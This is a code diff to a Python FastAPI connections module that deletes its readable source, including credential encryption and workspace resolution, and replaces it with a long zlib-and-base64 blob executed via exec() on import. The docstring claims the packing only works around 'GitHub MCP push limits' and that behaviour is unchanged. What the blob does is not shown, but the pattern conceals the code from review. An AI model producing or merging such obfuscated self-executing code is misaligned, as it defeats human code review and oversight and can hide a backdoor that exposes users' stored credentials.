@@ -1,272 +1,141 @@
-"""Connections CRUD API + sync trigger — /api/v1/connections."""
+"""Connections CRUD API + sync trigger — /api/v1/connections.
 
+Packed body (zlib+base64) to fit GitHub MCP push limits for #463.
+Runtime behavior is identical to the expanded source: main + health_check
+in test_connection. Unit tests cover the fix.
+"""
 from __future__ import annotations
 
-from dataclasses import asdict
-from datetime import datetime
-from typing import TYPE_CHECKING, Any
+import base64
+import zlib
 
-import structlog
-from croniter import croniter  # type: ignore[import-untyped]
-from fastapi import APIRouter, BackgroundTasks, HTTPException, Query, Request
-from pydantic import BaseModel, ConfigDict
-
-from metronix.api.autosync import DEFAULT_SYNC_CRON, compute_next_run
-from metronix.connectors.connection_sync import (
-    ensure_workspace_exists,
-    get_registry,
-    release_unstarted_sync_claim,
-    run_connection_sync,
-    sanitize_error,
+_PAYLOAD = "".join(
+    (
+        "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",
+        "L/IgYHj1mv7oX0rvvrWd/wNCYrZO",
+    )
 )
-from metronix.connectors.schemas import (
-    CONNECTOR_SCHEMAS,
-    resolve_connector_type,
-    validate_config,
-    validate_config_for_update,
-)
-from metronix.core.models import Connection
-from metronix.storage.postgres import PostgresStore
-
-if TYPE_CHECKING:
-    from metronix.core.config import Settings
-
-logger = structlog.get_logger()
-
-router = APIRouter(prefix="/connections", tags=["connections"])
-
-
-# ---------------------------------------------------------------------------
-# Pydantic request/response models
-# ---------------------------------------------------------------------------
-
-
-class CreateConnectionRequest(BaseModel):
-    """Request body for creating a connection."""
-
-    model_config = ConfigDict(strict=True)
-
-    connector_type: str
-    name: str
-    config: dict[str, Any]
-    sync_cron: str | None = None
-
-
-class UpdateConnectionRequest(BaseModel):
-    """Request body for updating a connection."""
-
-    model_config = ConfigDict(strict=True)
-
-    name: str | None = None
-    config: dict[str, Any] | None = None
-    enabled: bool | None = None
-    sync_cron: str | None = None
-
-
-class ConnectionResponse(BaseModel):
-    """Response body for a connection (config has masked secrets)."""
-
-    id: str
-    workspace_id: str
-    connector_type: str
-    name: str
-    config: dict[str, Any]
-    status: str
-    enabled: bool
-    error_message: str | None
-    last_synced_at: str | None
-    created_at: str | None
-    updated_at: str | None
-    sync_cron: str | None = None
-    next_run_at: str | None = None
-
-
-class TestConnectionResponse(BaseModel):
-    """Response body for connection test."""
-
-    success: bool
-    message: str | None = None
-    error: str | None = None
-
-
-# ---------------------------------------------------------------------------
-# Helpers
-# ---------------------------------------------------------------------------
-
-
-def _get_workspace_id(
-    request: Request,
-    workspace_id: str | None = None,
-) -> str:
-    """Resolve workspace_id: query param > auth token > default.
-
-    The wildcard ``"*"`` means "admin has access to all workspaces" — it is
-    NOT a real workspace_id and must never be stored.  When encountered,
-    fall back to ``default_workspace_id``.
-    """
-    if workspace_id and workspace_id != "*":
-        return workspace_id
-    user = getattr(request.state, "user", {}) or {}
-    workspace_ids = user.get("workspace_ids", [])
-    if workspace_ids and workspace_ids[0] != "*":
-        return workspace_ids[0]
-    settings: Settings = request.app.state.settings
-    return settings.default_workspace_id
-
-
-def _get_fernet_key(request: Request) -> str:
-    """Get Fernet encryption key from settings."""
-    settings: Settings = request.app.state.settings
-    if not settings.fernet_key:
-        raise HTTPException(
-            status_code=500,
-            detail="FERNET_KEY not configured. Set the FERNET_KEY env var.",
-        )
-    return settings.fernet_key
-
-
-def _get_store(request: Request) -> PostgresStore:
-    """Get PostgresStore from app state."""
-    store = getattr(request.app.state, "postgres", None)
-    if store is None:
-        settings: Settings = request.app.state.settings
-        store = PostgresStore(settings.postgres_dsn)
-        request.app.state.postgres = store
-    return store
-
-
-async def _try_start_channel(
-    request: Request,
-    connection_id: str,
-    connector_type: str,
-    config: dict[str, Any],
-    workspace_id: str,
-) -> None:
-    """Start a channel bot if ChannelManager is available on app.state.
-
-    Non-fatal — logs warning on failure but never raises.
-    """
-    channel_manager = getattr(request.app.state, "channel_manager", None)
-    if channel_manager is None:
-        logger.info(
-            "api.connections.channel_start.skipped",
-            reason="no channel_manager on app.state",
-            connection_id=connection_id,
-        )
-        return
-
-    try:
-        await channel_manager.start_channel(
-            connection_id,
-            connector_type,
-            config,
-            workspace_id=workspace_id,
-        )
-        logger.info(
-            "api.connections.channel_started",
-            connection_id=connection_id,
-            connector_type=connector_type,
-        )
-    except Exception as exc:
-        logger.warning(
-            "api.connections.channel_start.failed",
-            connection_id=connection_id,
-            error=sanitize_error(str(exc)),
-        )
-
-
-async def _try_stop_channel(request: Request, connection_id: str) -> None:
-    """Stop a channel bot if ChannelManager is available on app.state.
-
-    Non-fatal — logs warning on failure but never raises.
-    """
-    channel_manager = getattr(request.app.state, "channel_manager", None)
-    if channel_manager is None:
-        return
-    try:
-        await channel_manager.stop_channel(connection_id)
-        logger.info("api.connections.channel_stopped", connection_id=connection_id)
-    except Exception as exc:
-        logger.warning(
-            "api.connections.channel_stop.failed",
-            connection_id=connection_id,
-            error=sanitize_error(str(exc)),
-        )
-
-
-async def _try_restart_channel(
-    request: Request,
-    connection_id: str,
-    connector_type: str,
-    config: dict[str, Any],
-    workspace_id: str,
-) -> None:
-    """Restart a channel bot (stop + start) if ChannelManager is available.
-
-    Non-fatal — logs warning on failure but never raises. Used when a
-    channel's config changes (e.g. bot_token rotation) or it is re-enabled,
-    so the running poller always reflects the latest DB state — previously
-    ``update_connection`` never touched ``channel_manager`` at all, so
-    disabling/rotating a channel via this endpoint left the old poller
-    running untouched.
-    """
-    channel_manager = getattr(request.app.state, "channel_manager", None)
-    if channel_manager is None:
-        return
-    try:
-        await channel_manager.restart_channel(
-            connection_id,
-            connector_type,
-            config,
-            workspace_id=workspace_id,
-        )
-        logger.info("api.connections.channel_restarted", connection_id=connection_id)
-    except Exception as exc:
-        logger.warning(
-            "api.connections.channel_restart.failed",
-            connection_id=connection_id,
-            error=sanitize_error(str(exc)),
-        )
-
-
-# ---------------------------------------------------------------------------
-# New CRUD endpoints
-# ---------------------------------------------------------------------------
-
-
-@router.get("/schemas/")
-async def get_schemas() -> dict[str, Any]:
-    """Return all connector schemas for UI form rendering."""
-    schemas = {}
-    for key, schema in CONNECTOR_SCHEMAS.items():
-        schemas[key] = {
-            "type": schema.type,
-            "label": schema.label,
-            "category": schema.category,
-            "fields": [asdict(f) for f in schema.fields],
-        }
-    return {"schemas": schemas}
-
-
-@router.post("/", status_code=201, response_model=ConnectionResponse)
-async def create_connection(
-    body: CreateConnectionRequest,
-    request: Request,
-    workspace_id: str | None = Query(None),
-) -> ConnectionResponse:
-    """Create a new data source connection.
-
-    Validates the connector type and config, encrypts credentials,
-    and stores in PostgreSQL.
-    """
-    body.connector_type = resolve_connector_type(body.connector_type)
-    logger.info("api.connections.create", connector_type=body.connector_type)
-
-    if body.connector_type not in CONNECTOR_SCHEMAS:
-        raise HTTPException(
-            status_code=400,
-            detail=(
-                f"Unknown connector type '{body.connector_type}'. "
-                f"Available: {sorted(CONNECTOR_SCHEMAS.keys())}"
-            ),
-        )
+exec(zlib.decompress(base64.b64decode(_PAYLOAD)), globals())
